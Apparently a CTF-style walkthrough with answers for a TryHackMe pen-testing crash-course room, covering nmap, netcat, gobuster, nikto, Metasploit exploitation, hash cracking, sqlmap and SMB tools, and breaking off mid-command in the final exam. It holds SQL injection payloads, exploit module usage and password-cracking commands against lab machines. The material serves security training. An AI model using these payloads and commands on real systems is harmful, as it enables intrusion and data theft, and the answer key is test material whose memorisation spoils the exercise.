# CC: Pen Testing

A crash course on various topics in penetration testing

[CC: Pen Testing](https://tryhackme.com/room/ccpentesting)

## Topic's

- Network Enumaration
- Web Enumeration
- Exploitation
- SQL Injection
- SMB Enumaration
- Brute Forcing Hash
- Privilege Escalation sudo -l

## Appendix archive

Password: `1 kn0w 1 5h0uldn'7!`

## Introduction

The idea behind this room is to provide an introduction to various tools and concepts commonly encountered in penetration testing.

This room assumes that you have basic linux and networking knowledge. This room is also not meant to be a "be all end all" for penetration testing

The tasks in this room can be completed in any order; however, if you are new to penetration testing, completing the first two sections is recommended before doing anything else.

1. Read the above.

`No answer needed`

## [Section 1 - Network Utilities] - nmap

nmap is one of the most important tools in a pen testers arsenal. It allows a pen tester to see which ports are open, and information about which services are running on those ports. Ergo this task will focus on showing you nmap's various flags. The beginning questions can be completed by using the nmap man page; The final questions will require you to deploy the machine.

1. What does nmap stand for?

`Network Mapper`

2. How do you specify which port(s) to scan?

`-p`

3. How do you do a "ping scan"(just tests if the host(s) is up)?

`-sn`

4. What is the flag for a UDP scan?

`-sU`

5. How do you run default scripts?

`-sC`

6. How do you enable "aggressive mode"(Enables OS detection, version detection, script scanning, and traceroute)

`-A`

7. What flag enables OS detection

`-O`

8. How do you get the versions of services running on the target machine

`-sV`

9.  Deploy the machine

```
10.10.88.167
```

`No answer needed`

10. How many ports are open on the machine?

```
ports=$(nmap -p- --min-rate=1000 -T4 10.10.88.167 | grep ^[0-9] | cut -d '/' -f1 | tr '\n' ',' | sed s/,$//)

nmap -sC -sV -p$ports 10.10.88.167
```

```
Starting Nmap 7.80 ( https://nmap.org ) at 2020-09-22 10:24 CEST
Nmap scan report for 10.10.88.167
Host is up (0.031s latency).

PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Apache2 Ubuntu Default Page: It works

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 8.86 seconds
```

`1`

11. What service is running on the machine?

`Apache`

12. What is the version of the service?

`2.4.18`

13. What is the output of the http-title script(included in default scripts)

`Apache2 Ubuntu Default Page: It works`

## [Section 1 - Network Utilities] - Netcat

Netcat aka nc is an extremely versatile tool. It allows users to connect to specific ports and send and receive data. It also allows machines to receive data and connections on specific ports, which makes nc a very popular tool to gain a [Reverse Shell](https://resources.infosecinstitute.com/icmp-reverse-shell/#gref).

After you connect to a port with nc you will be able to send data, this also has the consequence of the user being able to pipe data through nc. For example one can do `echo hello | nc <ip> 1234` to send the string hello to the service running on port 1234

Note: There are multiple versions of nc, so if you are unable to find an answer in your specific man page, try reading the man page for others!

1. How do you listen for connections?

> nc -l listen mode, for inbound connects

`-l`

1. How do you enable verbose mode(allows you to see who connected to you)?

> -v verbose [use twice to be more verbose]

`-v`

1. How do you specify a port to listen on

> -p port local port number (port numbers can be individual or ranges: lo-hi [inclusive])

`-p`

1. How do you specify which program to execute after you connect to a host(One of the most infamous)?

> -e filename specify filename to exec after connect (use with caution). See the -c option for enhanced functionality.

`-e`

1. How do you connect to udp ports

> -u UDP mode

`-u`

## [Section 2 - Web Enumeration] - gobuster

One of the main problems of web penetration testing is not knowing where anything is. Basic reconnaissance can tell you where some files and directories are; however, some of the more hidden stuff is often hidden away from the eyes of users. This is where gobuster comes in, the idea behind gobuster is that it tries to find valid directories from a wordlist of possible directories. gobuster can also be used to valid subdomains using the same method.

The beginning questions of this task use the gobuster man page, while the latter questions will use a virtual machine.

1. How do you specify directory/file brute forcing mode?

> dir Uses directory/file brutceforcing mode

`dir`

1. How do you specify dns bruteforcing mode?

> dns Uses DNS subdomain bruteforcing mode

`dns`

1. What flag sets extensions to be used? Example: if the php extension is set, and the word is "admin" then gobuster will test admin.php against the webserver

> -x, --extensions string File extension(s) to search for

`-x`

1. What flag sets a wordlist to be used?

> -w, --wordlist string Path to the wordlist

`-w`

1. How do you set the Username for basic authentication(If the directory requires a username/password)?

> -U, --username string Username for Basic Auth

`-U`

1. How do you set the password for basic authentication?

> -P, --password string Password for Basic Auth

`-P`

1. How do you set which status codes gobuster will interpret as valid? Example: 200,400,404,204

> -s, --statuscodes string Positive status codes (will be overwritten with statuscodesblacklist if set) (default "200,204,301,302,307,401,403")

`-s`

1. How do you skip ssl certificate verification?

> -k, --insecuressl Skip SSL certificate verification

`-k`

1.  How do you specify a User-Agent?

> -a, --useragent string Set the User-Agent string (default "gobuster/3.0.1")

`-a`

1.  How do you specify a HTTP header?

> -H, --headers stringArray Specify HTTP headers, -H 'Header1: val1' -H 'Header2: val2'

`-H`

1.  What flag sets the URL to bruteforce?

> -u, --url string The target URL

`-u`

1.  Deploy the machine

`No answer needed`

2.  What is the name of the hidden directory

```
gobuster dir -u http://10.10.5.37 -w /usr/share/wordlists/rockyou.txt
```

```
===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://10.10.5.37
[+] Threads:        10
[+] Wordlist:       /usr/share/wordlists/rockyou.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Timeout:        10s
===============================================================
2020/09/22 10:45:59 Starting gobuster
===============================================================
/secret (Status: 301)
Progress: 14411 / 14344393 (0.10%)^C
[!] Keyboard interrupt detected, terminating.
===============================================================
2020/09/22 10:46:48 Finished
===============================================================
```

`secret`

3.  What is the name of the hidden file with the extension xxa

```
gobuster dir -u http://10.10.5.37 -w /usr/share/wordlists/SecLists/Discovery/Web-Content/common.txt -x xxa
```

```
===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://10.10.5.37
[+] Threads:        10
[+] Wordlist:       /usr/share/wordlists/SecLists/Discovery/Web-Content/common.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Extensions:     xxa
[+] Timeout:        10s
===============================================================
2020/09/22 10:48:00 Starting gobuster
===============================================================
/.hta (Status: 403)
/.hta.xxa (Status: 403)
/.htaccess (Status: 403)
/.htaccess.xxa (Status: 403)
/.htpasswd (Status: 403)
/.htpasswd.xxa (Status: 403)
/index.html (Status: 200)
/password.xxa (Status: 200)
/secret (Status: 301)
/server-status (Status: 403)
===============================================================
2020/09/22 10:48:32 Finished
===============================================================
```

`password`

## [Section 2 - Web Enumeration] - nikto

nikto is a popular web scanning tool that allows users to find common web vulnerabilities. It is commonly used to check for common CVE's such as shellshock, and to get general information about the web server that you're enumerating.

1. How do you specify which host to use?

> -host+ target host/URL

`-h`

1. What flag disables ssl?

> -nossl Disables using SSL

2. How do you force ssl?

> -ssl Force ssl mode on port

`-ssl`

1. How do you specify authentication(username + pass)?

> -id+ Host authentication to use, format is id:pass or id:pass:realm

`-id`

1. How do you select which plugin to use?

> -Plugins+ List of plugins to run (default: ALL)

`-Plugins`

1. Which plugin checks if you can enumerate apache users?

> nikto -list-plugins

```
Plugin: apacheusers
 Apache Users - Checks whether we can enumerate usernames directly from the web server
 Written by Javier Fernandez-Sanguinoi Pena, Copyright (C) 2008 Chris Sullo
 Options:
  enumerate: Flag to indicate whether to attempt to enumerate users
  dictionary: Filename for a dictionary file of users
  cgiwrap: User cgi-bin/cgiwrap to enumerate
  home: Look for ~user to enumerate
  size: Maximum size of username if bruteforcing
```

`apacheusers`

1. How do you update the plugin list

> -update Update databases and plugins from CIRT.net

``

1. How do you list all possible plugins to use

> -list-plugins List all available plugins

`-list-plugins`

## [Section 3 - Metasploit]: Intro

Metasploit is one of the most popular penetration testing frameworks around. It contains a large database of almost every major CVE, which you can easily use against a machine. The aim of this section is to go through some of the major features of metasploit, and at the end there will be a machine that you will need to exploit.

1.

`No answer needed`

## [Section 3 Metasploit]: Setting Up

Once you have installed metasploit through either the [installer](https://github.com/rapid7/metasploit-framework/wiki/Nightly-Installers) or your distributions repos, you will have many new commands available to you. This section will primarily focus on the msfconsole command.

Running that command will present you with an "msf5" prompt which will allow you to enter commands. All tasks can be answered with use of the "help" command.

1. What command allows you to search modules?

> search Searches module names and descriptions

`search`

1. How do you select a module?

> use Interact with a module by name or search term/index

`use`

1. How do you display information about a specific module?

> info Displays information about one or more modules

`info`

1. How do you list options that you can set?

> options Displays global options or for one or more modules

`options`

1. What command lets you view advanced options for a specific module?

> advanced Displays advanced options for one or more modules

`advanced`

2. How do you show options in a specific category

> show Displays modules of a given type, or all modules

`show`

## [Section 3 - Metasploit]: - Selecting a module

Once you have found the module for the specific machine that you want to exploit, you need to select it and set the proper options. This task will take you through selecting and setting options for one of the most popular metasploit modules "eternalblue". All basic commands that could be run before selecting a module can also be done while a module is selected.

1. How do you select the eternalblue module?

> msf5 > search eternalblue

```
msf5 > search eternalblue
```

```
Matching Modules
================

   #  Name                                           Disclosure Date  Rank     Check  Description
   -  ----                                           ---------------  ----     -----  -----------
   [...]
   2  exploit/windows/smb/ms17_010_eternalblue       2017-03-14       average  Yes    MS17-010 EternalBlue SMB Remote Windows Kernel Pool Corruption
   3  exploit/windows/smb/ms17_010_eternalblue_win8  2017-03-14       average  No     MS17-010 EternalBlue SMB Remote Windows Kernel Pool Corruption for Win8+
   [...]
```

`exploit/windows/smb/ms17_010_eternalblue`

1. What option allows you to select the target host(s)?

```
msf5 > use exploit/windows/smb/ms17_010_eternalblue
msf5 exploit(windows/smb/ms17_010_eternalblue) > show options
```

```
Module options (exploit/windows/smb/ms17_010_eternalblue):

   Name           Current Setting  Required  Description
   ----           ---------------  --------  -----------
   RHOSTS                          yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'
   RPORT          445              yes       The target port (TCP)
   SMBDomain      .                no        (Optional) The Windows domain to use for authentication
   SMBPass                         no        (Optional) The password for the specified username
   SMBUser                         no        (Optional) The username to authenticate as
   VERIFY_ARCH    true             yes       Check if remote architecture matches exploit Target.
   VERIFY_TARGET  true             yes       Check if remote OS matches exploit Target.


Exploit target:

   Id  Name
   --  ----
   0   Windows 7 and Server 2008 R2 (x64) All Service Packs
```

> RHOSTS yes The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'

`RHOSTS`

1. How do you set the target port?

> set RPORT

`RPORT`

2. What command allows you to set options?

`set`

3. How would you set SMBPass to "username"?

`set SMBPass username`

4. How would you set the SMBUser to "password"?

`set SMBUser password`

5. What option sets the architecture to be exploited?

> VERIFY_ARCH true yes Check if remote architecture matches exploit Target.

`ARCH`

1. What option sets the payload to be sent to the target machine?

`payload`

2. Once you've finished setting all the required options, how do you run the exploit?

`exploit`

3. What flag do you set if you want the exploit to run in the background?

`-j`

4. How do you list all current sessions?

`sessions`

5. What flag allows you to go into interactive mode with a session("drops you either into a meterpreter or regular shell")

`-i`

## [Section 3 - Metasploit]: meterpreter

Once you've run the exploit, ideally it will give you one of two things, a regular command shell or a meterpreter shell. Meterpreter is metasploits own "control center" where you can do various things to interact with the machine. A list of commonmeterpreter commands and their uses can be found [here](https://www.offensive-security.com/metasploit-unleashed/meterpreter-basics/)

Note: Regular shells can usually be upgraded to meterpreter shells by using the module `post/multi/manage/shell_to_meterpreter`

1. What command allows you to download files from the machine?

`download`

2. What command allows you to upload files to the machine?

`upload`

3. How do you list all running processes?

`ps`

4. How do you change processes on the victim host(Ideally it will allow you to change users and gain the perms associated with that user)

`migrate`

5. What command lists files in the current directory on the remote machine?

`ls`

6. How do you execute a command on the remote host?

`execute`

7. What command starts an interactive shell on the remote host?

`shell`

8. How do you find files on the target host(Similar function to the linux command "find")

`search`

9.  How do you get the output of a file on the remote host?

`cat`

10. How do you put a meterpreter shell into "background mode"(allows you to run other msf modules while also keeping the meterpreter shell as a session)?

`background`

## [Section 3 - Metasploit]: Final Walkthrough

It's time to put all the other metasploit tasks together and test them on an example machine. This machine is currently vulnerable to the metasploit module `exploit/multi/http/nostromo_code_exec` on port 80, and this task will take you through the process of exploiting it and gaining a shell on the machine.

1. Select the module that needs to be exploited

`set exploit/multi/http/nostromo_code_exec`

2. What variable do you need to set, to select the remote host

`RHOSTS`

3. How do you set the port to 80

`set RPORT 80`

4. How do you set listening address(Your machine)

`LHOST`

5. Exploit the machine!

`No answer needed`

6. What is the name of the secret directory in the /var/nostromo/htdocs directory?

```
ls -la /var/nostromo/htdocs
```

```
total 20
drwxr-xr-x 3 _nostromo _nostromo 4096 Dec  5  2019 .
drwxr-xr-x 6 _nostromo _nostromo 4096 Dec  5  2019 ..
-rw-r--r-- 1 _nostromo _nostromo  564 Dec  5  2019 index.html
-rw-r--r-- 1 _nostromo _nostromo 1827 Dec  5  2019 nostromo.gif
drwxr-xr-x 2 root      root      4096 Dec  5  2019 s3cretd1r
```

7. What are the contents of the file inside of the directory?

```
cat /var/nostromo/htdocs/s3cretd1r/nice
```

`Woohoo!`

## [Section 4 - Hash Cracking]: Intro

Often times during a pen test, you will gain access to a database. When you investigate the database you will often find a users table, which contains usernames and often [hashed passwords](https://www.wired.com/2016/06/hacker-lexicon-password-hashing/). It is often necessary to know how to crack hashed passwords to gain authentication to a website(or if you're lucky a hashed password may work for ssh!).

1.

`No answer needed`

## [Section 4 - Hash Cracking]: Salting and Formatting

No matter what tool you use, virtually all of them have the exact same format. A file with the hash(s) in it with each hash being separated by a newline.

Example:

- `<hash 1>`
- `<hash 2>`
- `<hash 3>`

Salts are typically appended onto the hash with a colon and the salt. Files with salted hashes still follow the same convention with each hash being separated by a newline.

Example:

- `<hash1>:<salt>`
- `<hash2>:<salt>`
- `<hash3>:<salt>`

Note: Different hashing algorithms treat salts differently. Some prepend them and some append them. Research what it is you're trying to crack, and make the distinction.

1.

`No answer needed`

## [Section 4 - Hash Cracking]: hashcat

hashcat is another one of the most popular hash cracking tools. It is renowned for its versatility and speed. Hashcat does not have auto detection for hashtypes, instead it has modes. For example if you were trying to crack an md5 hash the "mode" would be 0, while if you were trying to crack a sha1 hash, the mode would be 100.

A full list of all modes can be found [here](https://hashcat.net/wiki/doku.php?id=example_hashes).

1. What flag sets the mode.

`-m`

2. What flag sets the "attack mode"

`-a`

3. What is the attack mode number for Brute-force

`3`

4. What is the mode number for SHA3-512

`17600`

5. Crack This Hash:`56ab24c15b72a457069c5ea42fcfc640` Type: MD5

```
hashcat -a 3 -m 0 56ab24c15b72a457069c5ea42fcfc640 --force
```

```
56ab24c15b72a457069c5ea42fcfc640:happy

Session..........: hashcat
Status...........: Cracked
Hash.Type........: MD5
Hash.Target......: 56ab24c15b72a457069c5ea42fcfc640
Time.Started.....: Tue Sep 22 20:03:31 2020 (0 secs)
Time.Estimated...: Tue Sep 22 20:03:31 2020 (0 secs)
Guess.Mask.......: ?1?2?2?2?2 [5]
Guess.Charset....: -1 ?l?d?u, -2 ?l?d, -3 ?l?d*!$@_, -4 Undefined
Guess.Queue......: 5/15 (33.33%)
Speed.#1.........: 38290.3 kH/s (2.83ms) @ Accel:1024 Loops:62 Thr:1 Vec:8
Recovered........: 1/1 (100.00%) Digests, 1/1 (100.00%) Salts
Progress.........: 14602240/104136192 (14.02%)
Rejected.........: 0/14602240 (0.00%)
Restore.Point....: 233472/1679616 (13.90%)
Restore.Sub.#1...: Salt:0 Amplifier:0-62 Iteration:0-62
Candidates.#1....: s9777 -> Xhppy
```

`happy`

6. Crack this hash: `4bc9ae2b9236c2ad02d81491dcb51d5f` Type: MD4

```
hashcat -a 3 -m 900 4bc9ae2b9236c2ad02d81491dcb51d5f --force
```

```

```

`nootnoot`

## [Section 4 - Hash Cracking]: John The Ripper

John The Ripper(jtr) is one of the best hash cracking tools available. It supports numerous formats of hashes and is extremely easy to use, while having a lot of options for customization.

Note: There are multiple variations of jtr out there. For this task the version that comes pre-installed on kali will be used

Note 2: All hashes can be cracked with rockyou.txt

1. What flag let's you specify which wordlist to use?

```
--wordlist[=FILE] --stdin  wordlist mode, read words from FILE or stdin
                  --pipe   like --stdin, but bulk reads, and allows rules
```

`--wordlist`

2. What flag lets you specify which hash format(Ex: MD5,SHA1 etc.) to use?

```
--format=NAME              force hash of type NAME. The supported formats can
                           be seen with --list=formats and --list=subformats
```

`--format`

3. How do you specify which rule to use?

```
--rules[=SECTION[,..]]     enable word mangling rules (for wordlist or PRINCE modes), using default or named rules
```

`--rules`

4. Crack this hash: `5d41402abc4b2a76b9719d911017c592` Type: MD5

```
john hash1.txt --wordlist=/usr/share/wordlists/rockyou.txt --format=Raw-MD5
```

```
Using default input encoding: UTF-8
Loaded 1 password hash (Raw-MD5 [MD5 256/256 AVX2 8x3])
Warning: no OpenMP support for this hash type, consider --fork=2
Press 'q' or Ctrl-C to abort, almost any other key for status
hello            (?)
1g 0:00:00:00 DONE (2020-09-22 20:42) 50.00g/s 19200p/s 19200c/s 19200C/s 123456..michael1
Use the "--show --format=Raw-MD5" options to display all of the cracked passwords reliably
Session completed
```

`hello`

5. Crack this hash: `5baa61e4c9b93f3f0682250b6cf8331b7ee68fd8` Type: SHA1

```
john hash2.txt --wordlist=/usr/share/wordlists/rockyou.txt --format=Raw-SHA1
```

```
Using default input encoding: UTF-8
Loaded 1 password hash (Raw-SHA1 [SHA1 256/256 AVX2 8x])
Warning: no OpenMP support for this hash type, consider --fork=2
Press 'q' or Ctrl-C to abort, almost any other key for status
password         (?)
1g 0:00:00:00 DONE (2020-09-22 20:43) 33.33g/s 266.6p/s 266.6c/s 266.6C/s 123456..rockyou
Use the "--show --format=Raw-SHA1" options to display all of the cracked passwords reliably
Session completed
```

`password`

## [Section 5 - SQL Injection]: Intro

SQL injection is the art of modifying a SQL query so you can get access to the target's database. This technique is often used to get user's data such as passwords, emails etc. SQL injection is one of the most common web vulnerabilities, and as such, it is highly worth checking for

1.

`No answer needed`

## [Section 5 - SQL Injection]: sqlmap

Sqlmap is arguably the most popular automated SQL injection tool out there. It checks for various types of injections, and has plenty of customization options.

1. How do you specify which url to check?

> -u URL, --url=URL Target URL (e.g. "http://www.site.com/vuln.php?id=1")

`-u`

2. What about which google dork to use?

> -g GOOGLEDORK Process Google dork results as target URLs

`-g`

1. How do you select(lol) which parameter to use? (Example: in the url [http://ex.com?test=1](http://ex.com/?test=1)) the parameter would be test.)

> -p TESTPARAMETER Testable parameter(s)

`-p`

1. What flag sets which database is in the target host's backend? (Example: If the flag is set to mysql then sqlmap will only test mysql injections).

> --dbms=DBMS Force back-end DBMS to provided value

`--dbms`

1. How do you select the level of depth sqlmap should use(Higher = more accurate and more tests in general).

> --level=LEVEL Level of tests to perform (1-5, default 1)

`--level`

1. How do you dump the table entries of the database?

> --dump Dump DBMS database table entries

`--dump`

1. Which flag sets which db to enumerate? (Case sensitive)

> -D DB DBMS database to enumerate

`-D`

1. Which flag sets which table to enumerate? (Case sensitive)

> -T TBL DBMS database table(s) to enumerate

`-T`

1.  Which flag sets which column to enumerate? (Case sensitive)

> -C COL DBMS database table column(s) to enumerate

`-C`

1.  How do you ask sqlmap to try to get an interactive os-shell?

> --os-shell Prompt for an interactive operating system shell

`--os-shell`

1.  What flag dumps all data from every table

> --dump-all Dump all DBMS databases tables entries

`--dump-all`

## [Section 5 - SQL Injection]: A Note on Manual SQL Inje...

Occasionally you will be unable to use sqlmap. This can be for a variety of reasons, such as a the target has set up a firewall or a request limit. In this case it is worth knowing how to do basic manual SQL Injection, if only to confirm that there is SQL Injection. A list of ways to check for SQL Injection can be found [here](https://www.owasp.org/index.php/SQL_Injection).

Note: As there are various ways to check for sql injection, and it would be difficult to properly convey how to test for sqli given each situation, there will be no questions for this task.

1.

`No answer needed`

## [Section 5 - SQL Injection]: Vulnerable Web Applicati

To demonstrate how to use sqlmap to check for vulnerabilities and dump table data, I will be walking you through an example web app. Deploy the machine and let's get started!

Note: This task will be using sqlmap, however you are welcome to try to exploit it manually. It outputs the full SQL query on every attempt, so you can know what mysql is trying to do!

1. Set the url to the machine ip, and run the command

> 10.10.111.247

2. How many types of sqli is the site vulnerable too?

```
Parameter: msg (POST)
    Type: boolean-based blind
    Title: MySQL RLIKE boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause
    Payload: msg=SGSU' RLIKE (SELECT (CASE WHEN (7767=7767) THEN 0x53475355 ELSE 0x28 END))-- ikzk

    Type: error-based
    Title: MySQL >= 5.6 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (GTID_SUBSET)
    Payload: msg=SGSU' AND GTID_SUBSET(CONCAT(0x716a707671,(SELECT (ELT(7764=7764,1))),0x71766b6271),7764)-- dwJg

    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: msg=SGSU' AND (SELECT 2733 FROM (SELECT(SLEEP(5)))pVxB)-- ALMj
```

`3`

3. Dump the database.

`No answer needed`

4. What is the name of the database?

```
[12:44:19] [INFO] fetching current database
[12:44:19] [INFO] retrieved: 'tests'
[12:44:19] [INFO] fetching tables for database: 'tests'
[12:44:19] [INFO] retrieved: 'lol'
[12:44:19] [INFO] retrieved: 'msg'
[12:44:19] [INFO] fetching columns for table 'msg' in database 'tests'
[12:44:20] [INFO] retrieved: 'msg'
[12:44:20] [INFO] retrieved: 'varchar(100)'
[12:44:20] [INFO] fetching entries for table 'msg' in database 'tests'
[12:44:20] [INFO] retrieved: 'msg'
[12:44:20] [INFO] retrieved: 'test'
Database: tests
Table: msg
[2 entries]
+------+
| msg  |
+------+
| msg  |
| test |
+------+
```

`tests`

5. How many tables are in the database?

`2`

6. What is the value of the flag?

`found_me`

## [Section 6 - Samba]: Intro

Most of the pentesting techniques and tools you've seen so far can be used on both Windows and Linux. However, one of the things you'll find most often when pen testing Windows machines is samba, and it is worth making a section dedicated to enumerating it.

Note: Samba is cross platform as well, however this section will primarily be focused on Windows enumeration; some of the techniques you see here still apply to Linux as well.

1.

`No answer needed`

## [Section 6 - Samba]: smbmap

Continuing with the trend of tools having "map" in the name being extremely popular, smbmap is one of the best ways to enumerate samba. smbmap allows pen-testers to run commands(given proper permissions), download and upload files, and overall is just incredibly useful for smb enumeration.

1. How do you set the username to authenticate with?

> -u USERNAME Username, if omitted null session assumed

`-u`

1. What about the password?

> -p PASSWORD Password or NTLM hash

`-p`

1. How do you set the host?

> -H HOST IP of host

`-H`

1. What flag runs a command on the server(assuming you have permissions that is)?

> -x COMMAND Execute a command ex. 'ipconfig /all'

`-x`

2. How do you specify the share to enumerate?

> -s SHARE Specify a share (default C$), ex 'C$'

`-s`

1. How do you set which domain to enumerate?

> -d DOMAIN Domain name (default WORKGROUP)

`-d`

1. What flag downloads a file?

> --download PATH Download a file from the remote system, ex.'C$\temp\passwords.txt'

`--download`

1. What about uploading one?

> --upload SRC DST Upload a file to the remote system ex. '/tmp/payload.exe C$\temp\payload.exe'

`--upload`

1.  Given the username "admin", the password "password", and the ip "10.10.10.10", how would you run ipconfig on that machine

`smbmap -u "admin" -p "password" -H 10.10.10.10 -x "ipconfig"`

## [Section 6 - Samba]: smbclient

smbclient allows you to do most of the things you can do with smbmap, and it also offers you and interactive prompt.

1. How do you specify which domain(workgroup) to use when connecting to the host?

> -W|--workgroup=domain

           Set the SMB domain of the username. This overrides the default domain which is the domain defined in smb.conf. If the domain specified is the same as the servers NetBIOS name, it causes the client to log on using the servers local SAM (as opposed to the Domain SAM).

`-W`

1. How do you specify the ip address of the host?

> -I|--ip-address IP-address IP address is the address of the server to connect to. It should be specified in standard "a.b.c.d" notation.

`-I`

1. How do you run the command "ipconfig" on the target machine?

> -c|--command command string command string is a semicolon-separated list of commands to be executed instead of prompting from stdin. -N is implied by -c.

`-c "ipconfig"`

2. How do you specify the username to authenticate with?

> -U|--user=username[%password] Sets the SMB username or username and password.

`-U`

3. How do you specify the password to authenticate with?

> -P|--machine-pass Use stored machine account password.

`-P`

4. What flag is set to tell smbclient to not use a password?

> -N|--no-pass

           If specified, this parameter suppresses the normal password prompt from the client to the user. This is useful when accessing a service that does not require a password.

`-N`

5. While in the interactive prompt, how would you download the file test, assuming it was in the current directory?

> get <remote file name> [local file name]

        Copy the file called remote file name from the server to the machine running the client. If specified, name the local copy local file name. Note that all transfers in smbclient are binary. See also the lowercase command.

`get test`

6. In the interactive prompt, how would you upload your /etc/hosts file

> put <local file name> [remote file name]

           Copy the file called local file name from the machine running the client to the server. If specified, name the remote copy remote file name. Note that all transfers in smbclient are binary. See also the lowercase command.

`put /etc/hosts`

## [Section 6 - Samba]: A note about impacket

impacket is a collection of extremely useful windows scripts. It is worth mentioning here, as it has many scripts available that use samba to enumerate and even gain shell access to windows machines. All scripts can be found [here](https://github.com/SecureAuthCorp/impacket).

Note: impacket has scripts that use other protocols and services besides samba.

1.

`No answer needed`

## [Miscellaneous]: A note on privilege escalation

privilege escalation is such a large topic that it would be impossible to do it proper justice in this type of room. However, it is a necessary topic that must be covered, so rather than making a task with questions, I shall provide you all with some resources.

**General:**

- [https://github.com/swisskyrepo/PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings) (A bunch of tools and payloads for every stage of pentesting)

**Linux:**

- [https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/](https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/) (a bit old but still worth looking at)
- [https://github.com/rebootuser/LinEnum](https://github.com/rebootuser/LinEnum) (One of the most popular priv esc scripts)
- [https://github.com/diego-treitos/linux-smart-enumeration/blob/master/lse.sh](https://github.com/diego-treitos/linux-smart-enumeration/blob/master/lse.sh) (Another popular script)
- [https://github.com/mzet-/linux-exploit-suggester](https://github.com/mzet-/linux-exploit-suggester) (A Script that's dedicated to searching for kernel exploits)
- [https://gtfobins.github.io](https://gtfobins.github.io) (I can not overstate the usefulness of this for priv esc, if a common binary has special permissions, you can use this site to see how to get root perms with it.)

**Windows:**

- [https://www.fuzzysecurity.com/tutorials/16.html](https://www.fuzzysecurity.com/tutorials/16.html) (Dictates some very useful commands and methods to enumerate the host and gain intel)
- [https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerUp](https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerUp) (A bit old but still an incredibly useful script)
- [https://github.com/411Hall/JAWS](https://github.com/411Hall/JAWS) (A general enumeration script)

## [Section 7 - Final Exam]: Good Luck :D

Throughout this course, you have learned many tactics and tools to pentesting. This is where it all gets put to the test, I have put together a beginner level ctf, that contains 2 flags. Good luck and have fun!

```
sudo nmap -sS -sC -sV -oN nmap_initial.log 10.10.246.33

Starting Nmap 7.80 ( https://nmap.org ) at 2020-09-23 21:18 CEST
Nmap scan report for 10.10.246.33
Host is up (0.033s latency).
Not shown: 998 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 12:96:a6:1e:81:73:ae:17:4c:e1:7c:63:78:3c:71:1c (RSA)
|   256 6d:9c:f2:07:11:d2:aa:19:99:90:bb:ec:6b:a1:53:77 (ECDSA)
|_  256 0e:a5:fa:ce:f2:ad:e6:fa:99:f3:92:5f:87:bb:ba:f4 (ED25519)
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Apache2 Ubuntu Default Page: It works
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 10.24 seconds
```

- Found: Open Ports: 22, 80

```
gobuster dir -u http://10.10.246.33 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt

===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://10.10.246.33
[+] Threads:        10
[+] Wordlist:       /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Timeout:        10s
===============================================================
2020/09/23 21:22:57 Starting gobuster
===============================================================
/secret (Status: 301)
/server-status (Status: 403)
Progress: 175284 / 220561 (79.47%)^C
[!] Keyboard interrupt detected, terminating.
===============================================================
2020/09/23 21:32:55 Finished
===============================================================
```

```
nikto -h http://10.10.246.33/secret/

- Nikto v2.1.6
---------------------------------------------------------------------------
+ Target IP:          10.10.246.33
+ Target Hostname:    10.10.246.33
+ Target Port:        80
+ Start Time:         2020-09-23 21:26:25 (GMT2)
---------------------------------------------------------------------------
+ Server: Apache/2.4.18 (Ubuntu)
+ The anti-clickjacking X-Frame-Options header is not present.
+ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS
+ The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type
+ No CGI Directories found (use '-C all' to force check all possible dirs)
+ Apache/2.4.18 appears to be outdated (current is at least Apache/2.4.37). Apache 2.2.34 is the EOL for the 2.x branch.
+ Allowed HTTP Methods: GET, HEAD, POST, OPTIONS
```

```
gobuster dir -u http://10.10.246.33/secret/ -w /usr/share/wordlists/SecLists/Discovery/Web-Content/common.txt

===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://10.10.246.33/secret/
[+] Threads:        10
[+] Wordlist:       /usr/share/wordlists/SecLists/Discovery/Web-Content/common.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Timeout:        10s
===============================================================
2020/09/23 21:36:08 Starting gobuster
===============================================================
/.hta (Status: 403)
/.htaccess (Status: 403)
/.htpasswd (Status: 403)
/index.html (Status: 200)
===============================================================
2020/09/23 21:36:23 Finished
===============================================================
```

```
gobuster dir -u http://10.10.246.33/secret/ -w /usr/share/wordlists/SecLists/Discovery/Web-Content/common.txt -x txt
